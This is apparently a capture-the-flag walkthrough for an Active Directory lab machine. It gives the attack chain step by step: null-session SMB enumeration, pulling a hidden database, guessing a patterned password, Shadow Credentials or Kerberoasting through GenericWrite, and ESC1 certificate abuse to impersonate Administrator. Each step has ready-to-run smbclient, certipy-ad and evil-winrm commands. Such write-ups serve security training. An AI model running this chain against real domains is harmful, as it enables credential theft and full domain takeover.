1Anonymous SMB Enumeration

Guest/null-session access is enabled on the DC. Find the share that isn't part of the default admin set.

smbclient -L //DC_IP -N or crackmapexec smb DC_IP -u '' -p '' --shares

2Pull the Hidden Database

The share holds a handful of decoy files and one hidden database. Hidden doesn't mean invisible over SMB.

smbclient //DC_IP/Del_me -N then inside the session: ls, get Info.sqlite3

3Crack John Willium's Password

Open the database and look at the employee table. One record gives you everything you need to build a targeted wordlist for John Willium.

sqlite3 Info.sqlite3 "select * from Employe_Info;"
The password follows a Name<number>! pattern — pull the number straight from his record instead of brute forcing it.

4Abuse GenericWrite on Orange

John has been delegated GenericWrite over the Orange account. That's enough to take it over without ever knowing its password.

Two valid routes: a Shadow Credentials attack (certipy-ad shadow auto -u 'John Willium' -p 'John<number>!' -account Orange -dc-ip DC_IP), or targeted Kerberoasting by setting an SPN on Orange and cracking the returned TGS offline.

5Capture user.txt

You now control Orange. Log in and grab the flag sitting on the desktop.

evil-winrm -i DC_IP -u Orange -p '<orange_password>'
Flag path: C:\Users\Orange\Desktop\user.txt

6Find the Vulnerable Certificate Template

AD CS is installed on the domain. One certificate template lets any enrollee supply their own subject name — that's the ESC1 misconfiguration.

certipy-ad find -u Orange -p '<orange_password>' -dc-ip DC_IP -vulnerable -stdout

7Impersonate Administrator

Request a certificate through the vulnerable template with the Administrator's UPN and SID embedded, then authenticate with it to pull an NT hash or TGT.

certipy-ad req -u Orange -p '<orange_password>' -ca <ca_name> -template <vulnerable_template> -upn administrator@<domain> -sid <admin_sid> -dc-ip DC_IP
Then: certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP

8Capture root.txt

With Administrator's hash in hand, connect and take the final flag.

evil-winrm -i DC_IP -u administrator -H <nt_hash>
Flag path: C:\Users\Administrator\Desktop\root.txt
